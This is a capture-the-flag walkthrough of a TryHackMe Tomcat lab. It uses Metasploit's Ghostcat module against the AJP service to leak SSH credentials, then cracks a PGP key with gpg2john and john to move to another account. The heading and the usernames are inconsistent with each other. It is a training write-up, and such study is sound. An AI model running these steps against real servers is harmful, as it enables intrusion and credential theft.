<div align="center">

<img src="https://tryhackme.com/_next/image?url=https%3A%2F%2Fcdn-images.tryhackme.com%2Froom-icons%2F016dea7c96e8b422241016405b571c8b.jpeg&w=96&q=75" alt="TryHackMe Logo" width="220"/>

<br/>

[![TryHackMe](https://img.shields.io/badge/TryHackMe-Tomcat-red?style=for-the-badge&logo=tryhackme&logoColor=white)](https://tryhackme.com)
[![Difficulty](https://img.shields.io/badge/Difficulty-Easy-brightgreen?style=for-the-badge&logo=shield&logoColor=white)]()
[![Technique](https://img.shields.io/badge/Technique--blue?style=for-the-badge&logo=php&logoColor=white)]()

</div>

---

## 🕵️ Agent-Sudo — Full Walkthrough

> *"Something seems a little off with the server…"*
> — and it really was.

---

## Step 1 -- Lookup


Here is the nmap output

```
PORT     STATE SERVICE    VERSION
22/tcp   open  ssh        OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 f3:c8:9f:0b:6a:c5:fe:95:54:0b:e9:e3:ba:93:db:7c (RSA)
|   256 dd:1a:09:f5:99:63:a3:43:0d:2d:90:d8:e3:e1:1f:b9 (ECDSA)
|_  256 48:d1:30:1b:38:6c:c6:53:ea:30:81:80:5d:0c:f1:05 (ED25519)
53/tcp   open  tcpwrapped
8009/tcp open  ajp13      Apache Jserv (Protocol v1.3)
| ajp-methods: 
|_  Supported methods: GET HEAD POST OPTIONS
8080/tcp open  http       Apache Tomcat 9.0.30
|_http-title: Apache Tomcat/9.0.30
|_http-favicon: Apache Tomcat
```

Now we have 4 services

- ssh
- tcpwrapped
- ajp13
- http


Here when searched the ajp on exploitdb it showed me few results.


But the exploit tahat could actrully exploit the service ajp was via the msfconsole so i started the msfconsole 

And inside the msfconsole i searched "search 2020-1938* 

cuz this was the one cve in that exploit that could exploit the ajp actaully.


![exploit](https://miro.medium.com/v2/resize:fit:720/format:webp/1*AdiOiGDSxg325qUna2baSw.pngA)

Now we could use it by setting it 

with the command 

```
use auxiliary/admin/http/tomcat_ghostcat
```

![exploit](https://miro.medium.com/v2/resize:fit:720/format:webp/1*WMP7oOizuzfKztLhTh-4ag.png)

And saw what we need to set to run this auxiliary by the commadn 


```
show options
```

![options](https://miro.medium.com/v2/resize:fit:720/format:webp/1*Ta50i0n3GCsox_2Fuov5pg.png)


what we need to set is the rhost and we set it by the command 


```
set RHOSTS 10.112.188.87
```

And now we see again that it is being set or not so we did the show options again 

![options](https://miro.medium.com/v2/resize:fit:720/format:webp/1*0MQAw6-tCaPk4PRXjeYp1w.png)

And here we are ready to go so we hit run .

and we got something crutial.

![user](https://miro.medium.com/v2/resize:fit:720/format:webp/1*foyKD0ASaZMQuL4FevQlcQ.png)

Here we have a user named skyroot and his password too.

We're going to login to ssh with this user and password.

![gotin](https://miro.medium.com/v2/resize:fit:720/format:webp/1*9xQ8U_XdHGuY5bASfXujRA.png)

Here we're in.


As expected, this is an actual user of the machine, and simply by navigating through the machine, I was able to find the user flag.

![mage](https://miro.medium.com/v2/resize:fit:720/format:webp/1*c1wqPjvWTIzzpPXXpaUXKQ.png)

Something interesting was shown when listing the content of the user directory, as you can see we found 2 files :



**credential.pgp:** this PGP file is an encrypted file that might contain credentials for another user and can only be decrypted by a paraphrase to check its content.


**tryhackme.asc:** this is a key file that we have to crack in order to get the paraphrase that will be used to decrypt the credential.pgp file.


In order to start the cracking processing of “tryhackme.asc”, I started to copy these files to my local machine first, by typing:


```
scp skyfuck@tomghost.thm:/home/skyfuck/tryhackme.asc .

```

> SCP (secure copy) command in the Linux system is used to copy file(s) between servers in a secure way.

![img](https://miro.medium.com/v2/resize:fit:720/format:webp/1*tXto2Nb145Jw83TyJNOOnw.png)

We can save this file using others methods too.

Now after getting the hash anyhow we willl convert this key to hash 

using the

gpg2john tryhack.asc > hash

Now crack it with john 

john --wordlist=rockyou.txt hash


And we got the key as 

alexandru        (tryhackme) 

Now since I have the cracked password I can decrypt the credential.pgp by using :

gpg --import tryhackme.asc

Since its a .pgp file we will be using gpg to decrypt.

— import : is used to import the key file

gpg -d credential.pgp

— d: is used to decrypt the .pgp file.

And then you will be prompted to enter the cracked password from the tryhackme.asc file.

![img](https://miro.medium.com/v2/resize:fit:720/format:webp/1*I_PpKQVVHnD8zsvh23sYBQ.png)

Now we could login merlin with ssh credentials


